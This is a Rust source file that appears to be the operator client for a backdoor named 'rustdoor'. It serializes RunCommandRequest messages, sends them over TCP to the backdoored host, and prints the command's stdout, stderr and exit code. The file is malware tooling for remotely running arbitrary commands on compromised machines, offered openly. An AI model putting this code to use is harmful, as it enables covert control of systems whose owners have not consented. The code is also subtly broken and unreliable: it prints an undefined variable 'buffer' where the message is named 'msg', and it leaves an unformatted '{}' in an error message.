use byteorder::{BigEndian, WriteBytesExt};
use rustdoor::communication::messages::{
    MessageType, RunCommandRequest, RunCommandResponse, MESSAGE_LENGTH_SIZE, MESSAGE_TYPE_SIZE,
};
use rustdoor::communication::serialization::get_msg_type_and_length;
use std::io::{Error, Read, Write};
use std::net::{Shutdown, TcpStream};
use std::str::from_utf8;

fn make_run_command_request_buffer(command: String, async_run: bool) -> Vec<u8> {
    let req = RunCommandRequest { command, async_run };
    let serialized_message = ron::ser::to_string(&req).unwrap();

    let message_type = MessageType::RunCommandType as u8;
    let message_len = serialized_message.len();

    let mut buffer: Vec<u8> =
        Vec::with_capacity(message_len + MESSAGE_TYPE_SIZE + MESSAGE_LENGTH_SIZE);
    buffer.push(message_type);
    buffer.write_u32::<BigEndian>(message_len as u32).unwrap();
    buffer.extend(serialized_message.into_bytes());
    buffer
}

fn handle_response(message: &[u8], msg_length: usize, msg_type: u8) {
    println!("Response got: {:?}", message);
    if msg_type == MessageType::RunCommandType as u8 {
        let response: RunCommandResponse = ron::de::from_bytes(message).unwrap();
        println!("Stdout: {:?} ", from_utf8(&response.stdout).unwrap());
        println!("Stderr: {:?} ", from_utf8(&response.stderr).unwrap());
        println!("Error code: {:?}", response.error_code);
    }
}

pub fn run_command(command: String, mut stream: &TcpStream) -> Result<(), Error> {
    println!("Running command {} through backdoor.", command);
    let msg = make_run_command_request_buffer(command, false);

    println!("Sending buffer {:?}", buffer);
    stream.write(&msg).unwrap();
    println!("Sent message, awaiting reply...");

    let mut type_and_length = [0 as u8; MESSAGE_TYPE_SIZE + MESSAGE_LENGTH_SIZE];
    while match stream.read(&mut type_and_length) {
        Ok(size) => match size {
            0 => false,
            _ => {
                let (msg_type, msg_length) = get_msg_type_and_length(type_and_length);

                let mut message = vec![0; msg_length];
                let size = stream
                    .read(&mut message)
                    .expect("Could not read message after getting message metadata. Error: {}");
                // read function guarantees that we will read all data
                handle_response(&message, msg_length, msg_type);
                true
            }
        },
        Err(e) => {
            println!(
                "An error occurred, terminating connection with {}. Error: {}",
                stream.peer_addr()?,
                e
            );
            stream.shutdown(Shutdown::Both)?;
            false
        }
    } {}
    Ok(())
}
